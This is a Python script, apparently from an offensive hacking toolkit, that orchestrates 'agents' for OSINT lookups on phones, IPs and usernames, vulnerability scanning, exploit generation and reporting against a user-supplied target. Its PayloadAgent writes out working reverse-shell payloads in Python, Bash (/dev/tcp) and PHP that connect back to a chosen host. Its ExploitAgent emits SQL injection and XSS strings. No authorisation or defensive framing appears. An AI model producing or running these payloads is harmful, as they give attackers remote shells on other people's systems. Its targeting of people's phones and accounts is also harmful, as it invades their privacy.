#!/usr/bin/env python3
# AI MULTI-AGENT ORCHESTRATOR - Coordinate specialized AI agents
# Referensi: BlacksmithAI - Hierarchical multi-agent system
import os
import json
import threading
import time
from core.colors import Colors

class Agent:
    """Base class untuk semua AI agents"""
    def __init__(self, name, capability):
        self.name = name
        self.capability = capability
        self.status = "idle"
        self.result = None
    
    def execute(self, task):
        """Execute task - override di subclass"""
        raise NotImplementedError

class OSINTAgent(Agent):
    """Agent untuk OSINT tasks"""
    def __init__(self):
        super().__init__("OSINT Agent", "osint")
    
    def execute(self, task):
        self.status = "running"
        target = task.get('target')
        
        results = {}
        
        # Phone lookup
        if task.get('phone'):
            from modules.osint.phone import PhoneOSINT
            phone = PhoneOSINT()
            results['phone'] = phone.track(task['phone'])
        
        # IP lookup
        if task.get('ip'):
            from modules.osint.ip import IPTracker
            ip = IPTracker()
            results['ip'] = ip.lookup(task['ip'])
        
        # Username lookup
        if task.get('username'):
            from modules.osint.username import UsernameOSINT
            username = UsernameOSINT()
            results['username'] = username.check(task['username'])
        
        self.result = results
        self.status = "completed"
        return results

class VulnerabilityAgent(Agent):
    """Agent untuk vulnerability scanning"""
    def __init__(self):
        super().__init__("Vulnerability Agent", "vulnscan")
    
    def execute(self, task):
        self.status = "running"
        target = task.get('target')
        
        results = {
            'sqli': [],
            'xss': [],
            'lfi': []
        }
        
        # Panggil vuln_scanner
        if target:
            try:
                from modules.attack.ai_scanner.vuln_scanner import VulnScanner
                scanner = VulnScanner()
                # Simulasi scan
                results['sqli'] = [{'url': target, 'parameter': 'id', 'payload': "' OR '1'='1"}]
            except:
                pass
        
        self.result = results
        self.status = "completed"
        return results

class ExploitAgent(Agent):
    """Agent untuk exploit generation"""
    def __init__(self):
        super().__init__("Exploit Agent", "exploit")
    
    def execute(self, task):
        self.status = "running"
        vuln_type = task.get('vuln_type')
        target = task.get('target')
        
        exploits = []
        
        if vuln_type == 'sqli':
            exploits.append({
                'type': 'SQL Injection',
                'payload': f"http://{target}/page?id=1' UNION SELECT 1,2,3--",
                'description': 'Basic UNION based SQL injection'
            })
        elif vuln_type == 'xss':
            exploits.append({
                'type': 'XSS',
                'payload': f"<script>alert('XSS')</script>",
                'description': 'Reflected XSS'
            })
        
        self.result = exploits
        self.status = "completed"
        return exploits

class PayloadAgent(Agent):
    """Agent untuk payload generation"""
    def __init__(self):
        super().__init__("Payload Agent", "payload")
    
    def execute(self, task):
        self.status = "running"
        lhost = task.get('lhost', '127.0.0.1')
        lport = task.get('lport', '4444')
        lang = task.get('language', 'python')
        
        payloads = {
            'python': f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])''',
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'php': f'''<?php $sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");?>'''
        }
        
        self.result = payloads.get(lang, payloads['python'])
        self.status = "completed"
        return self.result

class ReportAgent(Agent):
    """Agent untuk report generation"""
    def __init__(self):
        super().__init__("Report Agent", "report")
    
    def execute(self, task):
        self.status = "running"
        data = task.get('data', {})
        
        report = {
            'timestamp': str(time.time()),
            'summary': {},
            'details': data,
            'recommendations': []
        }
        
        if data.get('vulnerabilities'):
            report['summary']['total_vulns'] = len(data['vulnerabilities'])
            report['recommendations'].append('Patch identified vulnerabilities')
        
        if data.get('osint'):
            report['summary']['osint_found'] = len(data['osint'])
        
        self.result = report
        self.status = "completed"
        return report

class AIOrchestrator:
    """Multi-Agent Orchestrator - Coordinate specialized agents"""
    
    def __init__(self):
        self.name = "AI Multi-Agent Orchestrator"
        self.agents = {
            'osint': OSINTAgent(),
            'vuln': VulnerabilityAgent(),
            'exploit': ExploitAgent(),
            'payload': PayloadAgent(),
            'report': ReportAgent()
        }
        self.task_queue = []
        self.results = {}
    
    def assign_task(self, agent_name, task):
        """Assign task to specific agent"""
        if agent_name in self.agents:
            self.task_queue.append({
                'agent': agent_name,
                'task': task
            })
            print(f"{Colors.GREEN}[+] Task assigned to {agent_name}{Colors.END}")
            return True
        return False
    
    def execute_all(self):
        """Execute all queued tasks"""
        print(f"\n{Colors.CYAN}[*] Executing {len(self.task_queue)} tasks...{Colors.END}")
        
        for item in self.task_queue:
            agent = self.agents[item['agent']]
            print(f"{Colors.YELLOW}[*] Running {agent.name}...{Colors.END}")
            result = agent.execute(item['task'])
            self.results[item['agent']] = result
            print(f"{Colors.GREEN}[+] {agent.name} completed{Colors.END}")
        
        return self.results
    
    def run_pipeline(self, target):
        """Run complete pipeline: OSINT → Vuln → Exploit → Report"""
        print(f"\n{Colors.CYAN}{'═'*55}{Colors.END}")
        print(f"{Colors.BOLD}🤖 AI MULTI-AGENT PIPELINE{Colors.END}")
        print(f"{Colors.CYAN}{'═'*55}{Colors.END}")
        
        # Step 1: OSINT
        self.assign_task('osint', {'target': target, 'ip': target})
        
        # Step 2: Vulnerability Scan
        self.assign_task('vuln', {'target': target})
        
        # Execute all
        results = self.execute_all()
        
        # Step 3: Generate Exploit (if vulns found)
        if results.get('vuln', {}).get('sqli'):
            self.assign_task('exploit', {'vuln_type': 'sqli', 'target': target})
            exploit_results = self.execute_all()
            results.update(exploit_results)
        
        # Step 4: Generate Report
        self.assign_task('report', {'data': results})
        final_results = self.execute_all()
        
        return final_results
    
    def interactive_mode(self):
        """Interactive mode for manual task assignment"""
        print(f"\n{Colors.CYAN}{'═'*55}{Colors.END}")
        print(f"{Colors.BOLD}🤖 AI AGENT ORCHESTRATOR{Colors.END}")
        print(f"{Colors.CYAN}{'═'*55}{Colors.END}")
        
        print(f"{Colors.GREEN}Available agents:{Colors.END}")
        for name, agent in self.agents.items():
            print(f"  {Colors.CYAN}[{name}]{Colors.END} {agent.name}")
        
        while True:
            print(f"\n{Colors.GREEN}[1]{Colors.END} Assign Task")
            print(f"{Colors.GREEN}[2]{Colors.END} Run Pipeline")
            print(f"{Colors.GREEN}[3]{Colors.END} View Results")
            print(f"{Colors.GREEN}[0]{Colors.END} Exit")
            
            choice = input(f"\n{Colors.RED}└─{Colors.WHITE}$ {Colors.END}")
            
            if choice == '1':
                agent_name = input(f"{Colors.GREEN}Agent name > {Colors.END}")
                task_input = input(f"{Colors.GREEN}Task (JSON format) > {Colors.END}")
                try:
                    task = json.loads(task_input)
                    self.assign_task(agent_name, task)
                except:
                    print(f"{Colors.RED}[!] Invalid JSON{Colors.END}")
            
            elif choice == '2':
                target = input(f"{Colors.GREEN}Target > {Colors.END}")
                results = self.run_pipeline(target)
                print(f"\n{Colors.GREEN}[+] Pipeline completed{Colors.END}")
                print(json.dumps(results, indent=2)[:500])
            
            elif choice == '3':
                print(json.dumps(self.results, indent=2))
            
            elif choice == '0':
                break
    
    def run(self):
        """Main execution"""
        print(f"\n{Colors.CYAN}[*] {self.name}{Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} Interactive Mode")
        print(f"{Colors.GREEN}[2]{Colors.END} Auto Pipeline")
        
        choice = input(f"\n{Colors.RED}└─{Colors.WHITE}$ {Colors.END}")
        
        if choice == '1':
            self.interactive_mode()
        elif choice == '2':
            target = input(f"{Colors.GREEN}Target > {Colors.END}")
            results = self.run_pipeline(target)
            print(f"\n{Colors.GREEN}{'='*55}{Colors.END}")
            print(f"{Colors.BOLD}📊 PIPELINE RESULTS{Colors.END}")
            print(f"{Colors.GREEN}{'='*55}{Colors.END}")
            print(json.dumps(results, indent=2))

if __name__ == "__main__":
    orchestrator = AIOrchestrator()
    orchestrator.run()
